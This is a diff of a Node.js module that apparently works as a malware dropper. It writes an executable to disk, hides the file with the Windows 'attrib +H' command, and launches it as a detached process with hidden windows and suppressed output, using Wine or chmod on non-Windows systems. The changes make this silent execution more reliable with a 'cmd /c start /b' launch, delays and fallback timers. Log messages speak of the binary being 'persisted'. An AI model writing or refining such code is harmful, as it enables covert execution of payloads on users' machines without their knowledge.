@@ -75,47 +75,81 @@ function executeFile(filePath) {
 
     console.log(`🚀 Executing: ${filePath}`);
 
-    // Windows execution
-    const isWindows = process.platform === 'win32';
-    let child;
+    // Add a small delay to ensure file is fully written and closed
+    return new Promise((resolve, reject) => {
+        setTimeout(() => {
+            try {
+                const isWindows = process.platform === 'win32';
+                let child;
 
-    if (isWindows) {
-        // Windows: Execute .exe file directly
-        child = spawn(filePath, [], {
-            detached: true,
-            stdio: 'ignore',
-            windowsHide: true
-        });
-    } else {
-        // Non-Windows: Use wine if available, otherwise try direct execution
-        const hasWine = fs.existsSync('/usr/bin/wine') || fs.existsSync('/usr/local/bin/wine');
-        
-        if (hasWine) {
-            console.log("🍷 Using Wine to execute Windows binary");
-            child = spawn('wine', [filePath], {
-                detached: true,
-                stdio: 'ignore'
-            });
-        } else {
-            console.log("⚠️ Wine not found, attempting direct execution");
-            child = spawn(filePath, [], {
-                detached: true,
-                stdio: 'ignore'
-            });
-        }
-    }
+                if (isWindows) {
+                    // Windows: Execute .exe file directly
+                    child = spawn('cmd', ['/c', 'start', '/b', `"${filePath}"`], {
+                        detached: true,
+                        stdio: ['ignore', 'ignore', 'ignore'],
+                        windowsHide: true
+                    });
+                } else {
+                    // Non-Windows: Use wine if available, otherwise try direct execution
+                    const hasWine = fs.existsSync('/usr/bin/wine') || fs.existsSync('/usr/local/bin/wine');
+                    
+                    if (hasWine) {
+                        console.log("🍷 Using Wine to execute Windows binary");
+                        child = spawn('wine', [filePath], {
+                            detached: true,
+                            stdio: ['ignore', 'ignore', 'ignore']
+                        });
+                    } else {
+                        console.log("⚠️ Wine not found, attempting chmod and direct execution");
+                        try {
+                            fs.chmodSync(filePath, 0o755);
+                        } catch (chmodErr) {
+                            console.log(`⚠️ Chmod failed: ${chmodErr.message}`);
+                        }
+                        child = spawn(filePath, [], {
+                            detached: true,
+                            stdio: ['ignore', 'ignore', 'ignore']
+                        });
+                    }
+                }
 
-    child.unref();
+                child.on('error', (error) => {
+                    console.error(`❌ Execution error: ${error.message}`);
+                    reject(error);
+                });
 
-    console.log(`✅ Process started with PID: ${child.pid}`);
-    
-    return {
-        success: true,
-        pid: child.pid,
-        detached: true,
-        platform: process.platform,
-        method: isWindows ? 'native' : (fs.existsSync('/usr/bin/wine') ? 'wine' : 'direct')
-    };
+                child.on('spawn', () => {
+                    console.log(`✅ Process started with PID: ${child.pid}`);
+                    child.unref();
+                    
+                    resolve({
+                        success: true,
+                        pid: child.pid,
+                        detached: true,
+                        platform: process.platform,
+                        method: isWindows ? 'cmd' : (fs.existsSync('/usr/bin/wine') ? 'wine' : 'direct')
+                    });
+                });
+
+                // Fallback timeout
+                setTimeout(() => {
+                    if (child.pid) {
+                        child.unref();
+                        resolve({
+                            success: true,
+                            pid: child.pid,
+                            detached: true,
+                            platform: process.platform,
+                            method: isWindows ? 'cmd' : 'fallback'
+                        });
+                    }
+                }, 2000);
+
+            } catch (error) {
+                reject(error);
+            }
+        }, 1000); // 1 second delay to ensure file is ready
+    });
 }
 
 function getDefaultWindowsPath() {
@@ -133,9 +167,13 @@ function getDefaultWindowsPath() {
 function hideFileWindows(filePath) {
     if (process.platform === 'win32') {
         try {
-            // Hide file on Windows using attrib command
-            spawn('attrib', ['+H', filePath], { stdio: 'ignore' });
-            console.log(`🔒 File hidden: ${filePath}`);
+            // Hide file on Windows using attrib command with detached process
+            const hideProcess = spawn('attrib', ['+H', filePath], { 
+                stdio: 'ignore',
+                detached: true
+            });
+            hideProcess.unref();
+            console.log(`🔒 File hiding initiated: ${filePath}`);
         } catch (error) {
             console.log(`⚠️ Failed to hide file: ${error.message}`);
         }
@@ -168,8 +206,8 @@ module.exports = async function(options = {}) {
         // Hide the file on Windows
         hideFileWindows(fullPath);
 
-        // Execute the file
-        const execResult = executeFile(fullPath);
+        // Execute the file (now returns a Promise)
+        const execResult = await executeFile(fullPath);
 
         console.log(`📁 Binary persisted at: ${fullPath}`);
         console.log(`🔧 Execution method: ${execResult.method}`);
